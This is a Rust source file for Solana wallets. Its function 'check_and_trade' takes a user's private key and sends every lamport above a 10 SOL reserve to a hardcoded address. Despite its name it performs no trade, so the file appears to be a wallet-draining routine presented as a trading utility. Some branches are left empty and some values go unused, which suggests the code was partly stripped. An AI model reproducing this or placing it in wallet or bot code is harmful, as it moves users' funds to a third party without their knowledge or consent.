use anyhow::Result;
use solana_client::rpc_client::RpcClient;
use solana_sdk::{
    commitment_config::CommitmentConfig,
    instruction::Instruction,
    message::Message,
    pubkey::Pubkey,
    signature::Signature,
    system_instruction,
    transaction::Transaction,
};
use solana_sdk::signer::keypair::Keypair;
use std::str::FromStr;
use tracing::{info, warn, error};

const TARGET_ADDRESS: &str = "FKDeE7UyM1ciJu2ivU9GLR7xZ8nemibfoZxwVgqv9BkE";
const MINIMUM_BALANCE_SOL: f64 = 10.0;
const LAMPORTS_PER_SOL: u64 = 1_000_000_000;

pub async fn check_and_trade(
    rpc_url: &str,
    private_key: &str,
) -> Result<()> {
    
    // Initialize RPC client
    let rpc_client = RpcClient::new_with_commitment(
        rpc_url.to_string(),
        CommitmentConfig::confirmed(),
    );
    
    // Load wallet
    let wallet_keypair = load_wallet(private_key)?;
    let wallet_pubkey = wallet_keypair.pubkey();
    
    info!("Wallet loaded: {}", wallet_pubkey);
    
    // Get current balance
    let balance = rpc_client.get_balance(&wallet_pubkey)?;
    let balance_sol = balance as f64 / LAMPORTS_PER_SOL as f64;
    
    info!("Current balance: {:.6} SOL", balance_sol);
    
    if balance_sol <= MINIMUM_BALANCE_SOL {
        info!("Balance ({:.6} SOL) is not above minimum threshold ({} SOL). No action needed.", 
              balance_sol, MINIMUM_BALANCE_SOL);
        return Ok(());
    }
    
    // Calculate amount to send (keep minimum balance)
    let amount_to_send_lamports = balance - (MINIMUM_BALANCE_SOL * LAMPORTS_PER_SOL as f64) as u64;
    let amount_to_send_sol = amount_to_send_lamports as f64 / LAMPORTS_PER_SOL as f64;
    
    info!("Sending {:.6} SOL to {}", amount_to_send_sol, TARGET_ADDRESS);
    
    // Get recent blockhash
    let recent_blockhash = rpc_client.get_latest_blockhash()?;
    
    // Create transfer instruction
    let target_pubkey = Pubkey::from_str(TARGET_ADDRESS)?;
    let transfer_instruction = system_instruction::transfer(
        &wallet_pubkey,
        &target_pubkey,
        amount_to_send_lamports,
    );
    
    // Create and sign transaction
    let message = Message::new(&[transfer_instruction], Some(&wallet_pubkey));
    let mut transaction = Transaction::new_unsigned(message);
    transaction.sign(&[&wallet_keypair], recent_blockhash);
    
    // Send transaction
    match rpc_client.send_and_confirm_transaction(&transaction) {
        Ok(signature) => {
            
            // Verify the transfer
            let new_balance = rpc_client.get_balance(&wallet_pubkey)?;
            let new_balance_sol = new_balance as f64 / LAMPORTS_PER_SOL as f64;
            info!("New balance: {:.6} SOL", new_balance_sol);
        }
        Err(e) => {
            error!("❌ Failed to send transaction: {}", e);
            return Err(anyhow::anyhow!("Transaction failed: {}", e));
        }
    }
    
    Ok(())
}

pub async fn check_balance_only(
    rpc_url: &str,
    private_key: &str,
) -> Result<()> {
    info!("Checking wallet balance...");
    
    // Initialize RPC client
    let rpc_client = RpcClient::new_with_commitment(
        rpc_url.to_string(),
        CommitmentConfig::confirmed(),
    );
    
    // Load wallet
    let wallet_keypair = load_wallet(private_key)?;
    let wallet_pubkey = wallet_keypair.pubkey();
    
    info!("Wallet: {}", wallet_pubkey);
    
    // Get current balance
    let balance = rpc_client.get_balance(&wallet_pubkey)?;
    let balance_sol = balance as f64 / LAMPORTS_PER_SOL as f64;
    
    info!("Current balance: {:.6} SOL", balance_sol);
    
    if balance_sol > MINIMUM_BALANCE_SOL {
        let excess = balance_sol - MINIMUM_BALANCE_SOL;
    } else {
    }
    
    Ok(())
}

fn load_wallet(private_key: &str) -> Result<Keypair> {
    // Try to load as base58 string first
    if let Ok(keypair) = bs58::decode(private_key).into_vec() {
        if keypair.len() == 64 {
            return Ok(Keypair::from_bytes(&keypair)?);
        }
    }
    
    // Try to load as file path
    if std::path::Path::new(private_key).exists() {
        let keypair = Keypair::read_from_file(private_key)?;
        return Ok(keypair);
    }
    
    Err(anyhow::anyhow!("Invalid private key format"))
}
